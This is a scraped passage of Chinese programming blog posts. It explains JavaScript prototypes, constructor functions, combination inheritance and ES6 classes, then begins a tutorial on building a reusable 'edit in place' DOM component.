<li><strong>代码重复</strong>：每个实例都要手动定义相同结构；</li>
<li><strong>无法批量生成</strong>：缺乏“模板”概念；</li>
<li><strong>无类型标识</strong>：无法判断 <code>cat1</code> 是否属于“猫”这个类别。</li>
</ul>
<p>于是，我们需要一种<strong>封装实例化过程</strong>的方式。</p>
<hr/>
<h3 data-id="heading-2">二、构造函数：封装实例化的第一步</h3>
<p>使用函数配合 <code>new</code> 关键字，模拟“类”的行为：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
}

<span class="hljs-keyword">const</span> cat1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">'加菲猫'</span>, <span class="hljs-string">'橘色'</span>);
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">'黑猫警长'</span>, <span class="hljs-string">'黑色'</span>);
</code></pre>
<h4 data-id="heading-3"><code>new</code> 调用时发生了什么？</h4>
<ol>
<li>创建一个空对象 <code>{}</code>；</li>
<li>将该对象的内部 <code>[[Prototype]]</code> 链接到构造函数的 <code>prototype</code>；</li>
<li>将 <code>this</code> 指向该空对象；</li>
<li>执行构造函数体，为 <code>this</code> 添加属性；</li>
<li>自动返回 <code>this</code>（除非显式返回一个非 <code>null</code> 对象）。</li>
</ol>
<blockquote>
<p>⚠️ 注意：若直接调用 <code>Cat()</code>（不加 <code>new</code>），<code>this</code> 指向全局对象（浏览器中是 <code>window</code>），造成污染。严格模式下会报错。</p>
</blockquote>
<h4 data-id="heading-4">类型判断</h4>
<ul>
<li><code>cat1 instanceof Cat</code> → <code>true</code></li>
<li><code>cat1.constructor === Cat</code> → <code>true</code></li>
</ul>
<p>这表明实例与构造函数建立了明确的归属关系。</p>
<hr/>
<h3 data-id="heading-5">三、原型（Prototype）：解决方法冗余问题</h3>
<p>如果我们在构造函数内定义方法：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'eat jerry'</span>); }; <span class="hljs-comment">// ❌ 每个实例都新建一个函数！</span>
}
</code></pre>
<p>这会导致<strong>内存浪费</strong>——每个实例都持有一份相同的函数副本。</p>
<h4 data-id="heading-6">解决方案：使用 <code>prototype</code></h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">type</span> = <span class="hljs-string">'猫科动物'</span>;
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'eat jerry'</span>);
};
</code></pre>
<p>所有通过 <code>new Cat()</code> 创建的实例，都会<strong>共享</strong>这些原型上的属性和方法。</p>
<h4 data-id="heading-7">如何区分“自身属性”和“继承属性”？</h4>
<ul>
<li><code>cat1.hasOwnProperty('name')</code> → <code>true</code>（自身）</li>
<li><code>cat1.hasOwnProperty('type')</code> → <code>false</code>（来自原型）</li>
<li><code>'type' in cat1</code> → <code>true</code>（无论来源）</li>
</ul>
<p>遍历实例属性时，建议过滤：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> prop <span class="hljs-keyword">in</span> cat1) {
  <span class="hljs-keyword">if</span> (cat1.<span class="hljs-title function_">hasOwnProperty</span>(prop)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(prop, cat1[prop]);
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-8">四、ES6 的 <code>class</code>：语法糖而已</h3>
<p>ES6 提供了更清晰的 OOP 语法：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, color</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
  }
  <span class="hljs-title function_">eat</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'eat jerry'</span>);
  }
}
</code></pre>
<p>但请注意：<strong><code>class</code> 本质仍是原型机制</strong>！</p>
<p>验证如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> cat1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">'tom'</span>, <span class="hljs-string">'黑色'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Cat</span>); <span class="hljs-comment">// true</span>
</code></pre>
<p>所以，<code>class</code> 只是让代码更易读，底层逻辑未变。</p>
<hr/>
<h3 data-id="heading-9">五、继承：如何让 <code>Cat</code> 继承 <code>Animal</code>？</h3>
<p>JavaScript 的继承需要同时处理两部分：</p>
<ul>
<li><strong>实例属性的继承</strong>（通过构造函数）</li>
<li><strong>原型方法的继承</strong>（通过原型链）</li>
</ul>
<h4 data-id="heading-10">步骤 1：借用构造函数（继承实例属性）</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">species</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">species</span> = species || <span class="hljs-string">'动物'</span>;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-string">'/////'</span>); <span class="hljs-comment">// 此时 this 是 Cat 的新实例</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// {} —— new Cat() 创建的新对象</span>
  <span class="hljs-comment">// 👇 关键：在当前 Cat 实例上下文中执行 Animal</span>
  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, [<span class="hljs-string">'哺乳动物'</span>]); <span class="hljs-comment">// 可传递参数！</span>
  
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
}
</code></pre>
<h5 data-id="heading-11">🔍 深入解析 <code>Animal.apply(this)</code></h5>
<ul>
<li>
<p><code>apply</code> 的第一个参数指定了函数执行时的 <code>this</code> 上下文。</p>
</li>
<li>
<p>当 <code>new Cat(...)</code> 被调用时，JS 引擎先创建一个新对象（设为 <code>obj</code>），并将 <code>Cat</code> 内部的 <code>this</code> 指向 <code>obj</code>。</p>
</li>
<li>
<p>执行 <code>Animal.apply(this)</code> 相当于：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 在 obj 上运行 Animal 函数</span>
obj.<span class="hljs-property">species</span> = <span class="hljs-string">'哺乳动物'</span>;
</code></pre>
</li>
<li>
<p>结果：<code>Cat</code> 实例拥有了 <code>species</code> 属性，且每个实例都有<strong>独立副本</strong>，避免引用类型共享问题。</p>
</li>
</ul>
<blockquote>
<p>✅ 优点：支持传参、属性隔离<br/>
❌ 缺点：<strong>无法继承 <code>Animal.prototype</code> 上的方法</strong></p>
</blockquote>
<h4 data-id="heading-12">步骤 2：设置原型链（继承原型方法）</h4>
<p>为了让 <code>Cat</code> 实例也能访问 <code>Animal</code> 原型上的方法，需建立原型链：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 先给 Animal 添加原型方法</span>
<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm a <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.species}</span>`</span>);
};

<span class="hljs-comment">// 让 Cat.prototype 指向一个 Animal 实例</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(); <span class="hljs-comment">// 注意：这里没传参，species 为默认值</span>

<span class="hljs-comment">// 修复 constructor 指向（否则 cat.constructor === Animal）</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Cat</span>;
</code></pre>
<p>现在测试：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">'加菲猫'</span>, <span class="hljs-string">'橘色'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat);
<span class="hljs-comment">// { species: '哺乳动物', name: '加菲猫', color: '橘色' }</span>

cat.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// ✅ "Hi, I'm a 哺乳动物"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Animal</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Cat</span>);    <span class="hljs-comment">// true</span>
</code></pre>
<h4 data-id="heading-13">完整继承模型图解</h4>
<pre><code class="hljs language-lua" lang="lua">cat (实例)
  └─ <span class="hljs-string">[[Prototype]]</span> → Cat.prototype (即 new Animal())
        └─ <span class="hljs-string">[[Prototype]]</span> → Animal.prototype
              └─ <span class="hljs-string">[[Prototype]]</span> → Object.prototype
                    └─ <span class="hljs-string">[[Prototype]]</span> → null
</code></pre>
<blockquote>
<p>💡 提示：现代开发中，可使用 <code>Object.create(Animal.prototype)</code> 替代 <code>new Animal()</code>，避免调用父构造函数带来的副作用（如不需要初始化父类实例属性时）。</p>
</blockquote>
<h4 data-id="heading-14">更健壮的组合继承写法（推荐）</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">species</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">species</span> = species || <span class="hljs-string">'动物'</span>;
}

<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm a <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.species}</span>`</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color</span>) {
  <span class="hljs-comment">// 继承属性（可传参）</span>
  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-string">'猫科动物'</span>); <span class="hljs-comment">// 使用 call 更常见（参数列表 vs 参数数组）</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
}

<span class="hljs-comment">// 继承方法（不调用 Animal 构造函数）</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Cat</span>;

<span class="hljs-comment">// 可继续扩展 Cat 自己的方法</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">meow</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Meow~'</span>);
};
</code></pre>
<p>这种模式称为 <strong>“组合继承”（Combination Inheritance）</strong> ，是 ES5 时代最常用的继承方式。</p>
<hr/>
<h3 data-id="heading-15">六、总结：JS OOP 的核心要点</h3>









































<table><thead><tr><th>概念</th><th>说明</th></tr></thead><tbody><tr><td><strong>构造函数</strong></td><td>用于创建实例，配合 <code>new</code> 使用</td></tr><tr><td><strong><code>prototype</code></strong></td><td>存放共享属性/方法，避免重复创建</td></tr><tr><td><strong><code>__proto__</code> / <code>[[Prototype]]</code></strong></td><td>实例指向其构造函数的 <code>prototype</code></td></tr><tr><td><strong><code>hasOwnProperty</code></strong></td><td>判断是否为自身属性</td></tr><tr><td><strong><code>instanceof</code></strong></td><td>检查原型链中是否存在某构造函数的 <code>prototype</code></td></tr><tr><td><strong>继承</strong></td><td>属性靠 <code>call/apply</code>，方法靠原型链</td></tr><tr><td><strong>ES6 <code>class</code></strong></td><td>语法糖，底层仍是原型</td></tr><tr><td><strong>组合继承</strong></td><td>最常用的传统继承模式（属性 + 原型链）</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-16">七、延伸思考：现代继承的最佳实践</h3>
<p>虽然组合继承很强大，但它<strong>调用了两次父构造函数</strong>（一次在 <code>new Animal()</code> 设置原型，一次在 <code>Cat</code> 内部），略显冗余。</p>
<p>ES6 之后，<strong>直接使用 <code>class extends</code> 是首选</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">species = <span class="hljs-string">'动物'</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">species</span> = species;
  }
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm a <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.species}</span>`</span>);
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, color</span>) {
    <span class="hljs-variable language_">super</span>(<span class="hljs-string">'猫科动物'</span>); <span class="hljs-comment">// 等价于 Animal.call(this, ...)</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
  }
  <span class="hljs-title function_">meow</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Meow~'</span>);
  }
}
</code></pre>
<ul>
<li>语义清晰</li>
<li>自动处理原型链</li>
<li>支持静态方法、getter/setter 等高级特性</li>
</ul>
<p>但请记住：<strong><code>super()</code> 底层仍然是 <code>Parent.call(this)</code> + 原型链设置</strong>。</p>
<blockquote>
<p>📌 <strong>终极箴言</strong>：<br/>
<strong>JavaScript 没有类，只有对象；没有继承，只有委托。</strong><br/>
理解原型链，就掌握了 JS 的灵魂。</p>
</blockquote>
<hr/>
<p><strong>标签：#JavaScript #面向对象 #原型链 #前端进阶 #ES6</strong><br/>
<strong>欢迎点赞、收藏、评论交流！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从零实现一个健壮可复用的“就地编辑”组件：深入剖析 OOP、DOM 与事件机制]]></title>    <link>https://juejin.cn/post/7579702046956027947</link>    <guid>https://juejin.cn/post/7579702046956027947</guid>    <pubDate>2025-12-04T11:57:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579702046956027947" data-draft-id="7579659550862327850" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从零实现一个健壮可复用的“就地编辑”组件：深入剖析 OOP、DOM 与事件机制"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-12-04T11:57:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="想要成为糕糕手"/> <meta itemprop="url" content="https://juejin.cn/user/4381975238424308"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从零实现一个健壮可复用的“就地编辑”组件：深入剖析 OOP、DOM 与事件机制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4381975238424308/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    想要成为糕糕手
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T11:57:31.000Z" title="Thu Dec 04 2025 11:57:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">从零实现一个健壮可复用的“就地编辑”组件：深入剖析 OOP、DOM 与事件机制</h2>
<p>在现代 Web 应用中，用户期望“所见即所编”的流畅体验——点击一段文字就能直接修改，无需跳转页面。这种交互模式称为 <strong>“就地编辑”（Edit In Place）</strong> ，广泛应用于个人主页、后台管理系统、协作平台等场景。</p>
<p>但要写出一个<strong>安全、健壮、可复用</strong>的就地编辑组件，并非只是“把 span 换成 input”那么简单。它涉及：</p>
<ul>
<li><strong>面向对象设计（OOP）</strong></li>
<li><strong>DOM 元素创建与管理</strong></li>
<li><strong>事件绑定与 <code>this</code> 上下文</strong></li>
<li><strong>数据与视图的一致性</strong></li>
<li><strong>XSS 安全防护</strong></li>
</ul>
<p>本文将带你从零构建一个生产级 <code>EditInPlace</code> 组件，并<strong>逐行解析你曾困惑的所有细节</strong>，助你真正掌握前端核心能力。</p>
<hr/>
<h3 data-id="heading-1">一、为什么需要封装？OOP 带来的工程价值</h3>
<p>假设你要在多个页面实现“可编辑标语”，如果每次都写：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ❌ 重复、脆弱、难维护</span>
<span class="hljs-keyword">const</span> span = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'slogan'</span>);
span.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 手动创建 input、按钮...</span>
    <span class="hljs-comment">// 手动处理保存、取消...</span>
});
</code></pre>
<p>很快你会陷入“复制粘贴地狱”。</p>
<p>✅ <strong>OOP 封装的价值</strong>：</p>

























<table><thead><tr><th>优势</th><th>说明</th></tr></thead><tbody><tr><td><strong>复用性</strong></td><td>一行 <code>new EditInPlace(...)</code> 即可集成</td></tr><tr><td><strong>隐藏实现</strong></td><td>使用者无需关心 DOM 操作细节</td></tr><tr><td><strong>状态隔离</strong></td><td>每个实例独立管理自己的 <code>value</code> 和元素</td></tr><tr><td><strong>团队协作</strong></td><td>编写者专注逻辑，使用者专注配置</td></tr></tbody></table>
<blockquote>
<p>📌 <strong>开发演进路径</strong>：<br/>
流程代码 → 类封装 → 模块化文件<br/>
这是前端工程化的必经之路。</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">二、核心结构：属性 + 方法 = 完整组件</h3>
<p>我们采用构造函数 + 原型方法的经典 OOP 模式：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">EditInPlace</span>(<span class="hljs-params">id, value, parentElement</span>) {
    <span class="hljs-comment">// ✅ 属性：存储状态与 DOM 引用</span>
     <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value || <span class="hljs-string">'这个家伙很懒，什么都没留下'</span>; <span class="hljs-comment">// 核心数据！</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentElement</span> = parentElement;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">containerElement</span> = <span class="hljs-literal">null</span>;   <span class="hljs-comment">// 外层容器 &lt;div&gt;</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">staticElement</span> = <span class="hljs-literal">null</span>;      <span class="hljs-comment">// 显示文本 &lt;span&gt;</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fieldElement</span> = <span class="hljs-literal">null</span>;       <span class="hljs-comment">// 编辑输入框 &lt;input&gt;</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">saveButton</span> = <span class="hljs-literal">null</span>;         <span class="hljs-comment">// 保存按钮</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">cancelButton</span> = <span class="hljs-literal">null</span>;       <span class="hljs-comment">// 取消按钮</span>

    <span class="hljs-comment">// ✅ 自动初始化</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createElement</span>(); <span class="hljs-comment">// DOM对象创建</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">attachEvent</span>(); <span class="hljs-comment">// 绑定交互事件</span>
}
</code></pre>
<blockquote>
<p>🔥 <strong>关键认知</strong>：<br/>
<code>this.value</code> 是组件的 <strong>“唯一真实数据源”（Single Source of Truth）</strong> ，所有视图都基于它渲染。</p>
</blockquote>
<hr/>
<h3 data-id="heading-3">三、深度解析：你曾问过的每一个细节</h3>
<h4 data-id="heading-4">🔹 1. <code>document.createElement('div')</code> 到底做了什么？</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">this</span>.<span class="hljs-property">containerElement</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
</code></pre>
<ul>
<li>在<strong>内存中创建一个全新的 <code>&lt;div&gt;</code> 元素对象</strong></li>
<li>此时它<strong>尚未挂载到页面</strong>，用户不可见</li>
<li>后续通过 <code>appendChild</code> 将其插入 DOM 树</li>
</ul>
<blockquote>
<p>💡 <strong>类比</strong>：像在纸上画一个盒子，还没贴到墙上。</p>
</blockquote>
<hr/>
<h4 data-id="heading-5">🔹 2. <code>appendChild</code> 如何组装界面？</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">this</span>.<span class="hljs-property">containerElement</span>.<span class="hljs-title function_">appendChild</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">staticElement</span>);
</code></pre>
<ul>
<li>将 <code>staticElement</code>（<code>&lt;span&gt;</code>）作为子节点插入 <code>containerElement</code>（<code>&lt;div&gt;</code>）</li>
